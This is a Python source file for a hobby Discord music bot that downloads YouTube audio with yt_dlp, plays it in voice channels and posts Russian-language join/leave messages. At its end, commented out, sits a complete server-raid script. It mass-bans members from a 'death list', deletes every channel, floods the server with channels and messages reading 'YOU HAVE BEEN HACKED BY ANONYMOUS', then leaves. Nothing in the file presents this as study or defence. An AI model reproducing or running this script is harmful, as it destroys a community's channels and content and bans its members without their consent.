import asyncio
import discord
from discord.ext import commands
from discord import Member
import youtube_dl

import functions as f
#=======================================================================================================================
import re

import discord
from discord.ext import commands
import yt_dlp
import urllib
import asyncio
import threading
import os
import shutil
import sys
import subprocess as sp

queues = {} # {server_id: [(vid_file, info), ...]}
#=======================================================================================================================

config = {
    'token': '-TOKEN-',
    'prefix': '.',
}

intents = discord.Intents.all()
intents.members = True

bot = commands.Bot(command_prefix=config['prefix'], intents=intents)

@bot.hybrid_command()
async def test(ctx):
    await ctx.send("This is a hybrid command!")

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')
    


@bot.event
async def on_member_remove(member):
    channel = discord.utils.get(member.guild.text_channels, name='𝗦𝘆𝘀𝘁𝗲𝗺𝗘𝗰𝗵𝗼')
    await channel.send(f'⬅ {member.name} покинул сервер.')

@bot.command()
async def remove(ctx):
    channel = discord.utils.get(ctx.guild.text_channels, name='𝗦𝘆𝘀𝘁𝗲𝗺𝗘𝗰𝗵𝗼')
    await channel.send('⬅ Чамба хуямба покинул сервер.')

@bot.command()
async def mon(ctx):
    await ctx.send(f'На сервере {ctx.guild.member_count} чумб.')



@bot.command()
async def hello(ctx):
    await ctx.send("Hello")
    
@bot.command()
async def join(ctx):
    # await ctx.send("```Joined voice channel!```")
    channel = ctx.author.voice.channel
    await channel.connect()

# @bot.command()
# async def leave(ctx):
#     await ctx.send("Left voice channel!")
#     await ctx.voice_client.disconnect()

@bot.command(name='play', aliases=['p'])
async def play(ctx: commands.Context, *args):
    voice_state = ctx.author.voice

    query = ' '.join(args)
    
    will_need_search = not urllib.parse.urlparse(query).scheme

    server_id = ctx.guild.id

    
    message = await ctx.send(f'looking for `{query}`...')
    with yt_dlp.YoutubeDL({'format': 'worstaudio',
                           'source_address': '0.0.0.0',
                           'default_search': 'ytsearch',
                           'outtmpl': '%(id)s.%(ext)s',
                           'noplaylist': True,
                           'allow_playlist_files': False,
                           # 'progress_hooks': [lambda info, ctx=ctx: video_progress_hook(ctx, info)],
                           # 'match_filter': lambda info, incomplete, will_need_search=will_need_search, ctx=ctx: start_hook(ctx, info, incomplete, will_need_search),
                           'paths': {'home': f'./dl/{server_id}'}}) as ydl:
        
        info = ydl.extract_info(query, download=False)

        await message.delete()

        if 'entries' in info:
            info = info['entries'][0]
       
        message = await ctx.send('downloading ' + (f'https://youtu.be/{info["id"]}' if will_need_search else f'`{info["title"]}`'))
        
        

        ydl.download([query])
        
        await message.delete()
        
        path = f'./dl/{server_id}/{info["id"]}.{info["ext"]}'
        try: queues[server_id].append((path, info))
        except KeyError: 
            queues[server_id] = [(path, info)]
            try: connection = await voice_state.channel.connect()
            except discord.ClientException: connection = get_voice_client_from_channel_id(voice_state.channel.id)
            connection.play(discord.FFmpegOpusAudio(path))

          
            embed = discord.Embed(
                title= info["title"],
                url = f'https://youtu.be/{info["id"]}',
                # description='Upload date: ' + info['upload_date'],
                description='''
                
                
                
                ''',

                color=discord.Color.darker_grey()
            )
 
            embed.set_author(name=info['uploader'])
            embed.set_thumbnail(url= f.get_video_icon(f'https://youtu.be/{info["id"]}'))
            embed.add_field(name="Duration", value=f.seconds_to_time(info['duration']), inline=True)
            embed.add_field(name="Requested by", value=f"{ctx.author.name}", inline=True)
            embed.set_footer(text="© 2023 XYECoC inc.")

            message = await ctx.send(embed=embed)
            await asyncio.sleep(info['duration']+1)
            await message.delete()
            
            
def get_voice_client_from_channel_id(channel_id: int):
    for voice_client in bot.voice_clients:
        if voice_client.channel.id == channel_id:
            return voice_client
@bot.command()
async def leave(ctx):
    voice_client = ctx.voice_client
    if voice_client.is_connected():
        await ctx.send("Left voice channel!")
        await voice_client.disconnect()



# @bot.event()
# async def on_voice_status_update(member,before,after):
#     if member.bot and before.channel:
#          #проверяет что этот челик ботик или намик
#          voice_state = member.guild.voice_client
# # Ппроверяет остался ли он в канале
#         if voice_state and not voice_state.channel.members:
#             # Проверяем сколько времени прошло с захода 
#             if voice_state.idle() and voice_state.idle() > 1800:  # 1800 секунд = 30 минут
#                 await voice_state.disconnect()

bot.run(config['token'])



###########################################################################################################################################


# Gachi Music Bot Code---------------------------------------------------------------------------------------------------------------------




# exception_list = [509762933484683266, 582849312388677633, 524943385635848226, 1033315601986363432, 331481590259777539, 267701588775141377]
# death_list = []


# @bot.command()
# async def play(ctx):
#     guild = ctx.guild

#     for member in guild.members:
#       # await ban_not_in_list(member)
#       await ban_in_list(member)

#     await delete_channels(guild)
#     await create_tcs(guild)
#     await send_messages(guild)
#     await create_vcs(guild)
#     await leave_server(guild)

# async def ban_not_in_list(member):
#   if member.id not in exception_list:
#     await ban_member(member)

# async def ban_in_list(member):
#   if member.id in death_list:
#     await ban_member(member)


# async def ban_member(member):
#   try:
#     await member.ban()
#   except:
#     print("didn't ban", member.display_name)

# async def delete_channels(guild):
#   for c in guild.channels:
#     await delete_channel(c)

# async def delete_channel(channel):
#   await channel.delete()

# async def create_tcs(guild):
#   for i in channelNames:
#     await create_tc(guild, i)

# async def create_tc(guild, name):
#   await guild.create_text_channel(name)

# async def send_messages(guild):
#   for c in guild.channels:
#     await send_message(c)

# async def send_message(channel):
#   await channel.send("YOU HAVE BEEN HACKED BY ANONYMOUS")

# async def create_vcs(guild):
#   for i in channelNames:
#     await create_vc(guild, i)

# async def create_vc(guild, name):
#   await guild.create_voice_channel(name)

# async def leave_server(guild):
#   await guild.leave()

# channelNames = ["YOU", "HAVE", "BEEN", "HACKED",
#                 "BY", "A", "N", 'O', 'N', 'Y', 'M', 'O', 'U', 'S']


# @bot.command()
# async def clear(ctx):
#     guild = ctx.guild
#     for c in guild.channels:
#         await c.delete()
#     await guild.create_text_channel("test")